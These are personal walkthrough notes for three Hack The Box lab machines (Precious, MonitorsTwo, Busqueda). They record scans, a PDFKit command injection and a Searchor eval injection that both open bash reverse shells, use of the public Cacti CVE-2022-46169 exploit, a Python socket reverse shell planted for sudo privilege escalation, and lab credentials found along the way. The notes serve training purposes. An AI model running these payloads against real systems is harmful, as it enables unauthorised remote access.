# HTB_Machines_Easy

## Precision
1. nmap -sC -sV 10.129.45.198

    - 22/tcp open ssh (OpenSSH 8.4p1 Debian 5+deb11u1)
        - ssh-hostkey = RSA/ECDSA/ED25519
    - 80/tcp open http (nginx/1.18.0)
        - http-title: Did not follow redirect to http://precious.htb/
        
   // we are able to connect remotely through SSH
   // look like a web app, which we can display through HTTP in a browser
   // Cant be reached by just IP address -> we need to configure redirect (DNS) at our local file /etc/hosts
   
   
2. sudo nano /etc/hosts -> 10.129.45.198   precious.htb

    - adding URL precious.htb as IP address of the host   
    
    
3. Web App analysis
    
    - user inserts some web page URL, by submitting the Web App converts the given URL into PDF file
    
    
    
4. Crafting "command injection in pdf"

    - https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
    - lets edit it for our case
        - http://localhost/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.131/8000 0>&1"`'}
            - https://www.revshells.com/
                - nc -lvnp 8000
                - sh -i >& /dev/tcp/10.10.14.131/8000 0>&1
                    - IP address of VPN connection with HTB, not IP address of machine, we are willing to attack
                    - port 8000     
    
5. nc -lvnp 8000
    - listening all the communication at port number 8000
    

6. Launch Burpsuite+FoxyProxy


7. http://localhost/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.131/8000 0>&1"`'}
    - On the website precious.htb we enter the crafted command injection
    - in the terminal under nc -lvnp 8000 we can see, that we are successfuly connected to the webserver
    
    
8. Exploring the shell: ruby@precious:/var/www/pdfapp$
    - ls
    - cd ~/.bundle
    - ls
    - cat config
        - BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
            - credentials for SSH connection into targeted machine IP address
                - UN: henry
                - PW: Q3c1AqGHtoI0aXAYFH
                
                
9. SSH connection into targeted machine IP address
    - ssh henry@10.129.45.198       //IP address of the generated IP targeted machine
        - PW: Q3c1AqGHtoI0aXAYFH
    - ls
    - cat user.txt
        - USER FLAG: "XXXXX"
        

10. Hunting the root flag
    - ln -s /root/root.txt dependencies.yml
    - sudo /usr/bin/ruby /opt/update_dependencies.rb
        - Even we get an error, it is enough for us :-) root flag is involved in the error message
            - Traceback (most recent call last): /opt/update_dependencies.rb:20:in `<main>': undefined method `each' for "XXXXX":String (NoMethodError)
    - ROOT FLAG: "XXXXX"

## MonitorsTwo
1. Observe opened ports
    - `sudo nmap <ip>`
        - 22/tcp open ssh
        - 80/tcp open http
2. Observe website (http is open)
    - URL = 10.10.11.211
        -  login screen
        -  Cacti version 1.2.22
            -  search for the vulns
                -  CVE-2022-46169 (https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)
3. Exploit the CVE-2022-46169 vuln
    - download the exploit script
        - `git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22`
    - `nc -nlvp 443`
    - `python3 CVE-2022-46169.py  -u http://<ip> --LHOST=<local_IP> --LPORT=443`
        - LHOST can be obtained with `ifconfig` -> tun0 IP
    - explore the reverse shelled connection
        - `whoami` `ls -l /`
        - `ls -la /`
            - we can see the file ".dockerenv" -> we are inside Docker container
        - `cat entrypoint.sh`
            >mysql --host=db --user=root --password=root cacti -e "show tables"

        - `mysql --host=db --user=root --password=root cacti -e "show tables"`


## Busqueda
1. Reco
`sudo nmap -sVC 10.10.11.208`
    - sudo nano /etc/hosts
        - 10.10.11.208  searcher.htb
2. Weaponisation
App is running Searchor v2.4.0 which has vuln
![](https://hackmd.io/_uploads/S1qlltUqh.png)

3. Exploitation
- as a search value, insert RS inside it:
    - `nc -nlvp 4444`
    - `'),__import__('os').system('bash -c "bash -i >& /dev/tcp/<IP>/<port> 0>&1"')#`

4. User flag
    - cd
    - cat user.txt

5. Root flag
    
    ![](https://hackmd.io/_uploads/HkC_MK8qn.png)
    - UN: cody
    - PW: jh1usoih2bkjaspwe92 
- SSH connect
    - ssh svc@10.10.11.208
        - PW: jh1usoih2bkjaspwe92
    - we can edit the python script file
        - ![](https://hackmd.io/_uploads/SyKJVFIqn.png)
- PE
    - [exploit](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/)
        - `import socket,os,pty;s=socket.socket();s.connect(("<local-ip>",<port>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")`
    - cd
        - `nano full-checkup.sh`
            - ![](https://hackmd.io/_uploads/HyyBHKLq3.png)

```
#!/usr/bin/python3
import socket,os,pty;s=socket.socket();s.connect(("10.10.14.12",1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
```
- `chmod +x full-checkup.sh`
    - LOCAL machine: `nc -nlvp <port>`
    - `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`

![](https://hackmd.io/_uploads/S13UdFU9h.png)


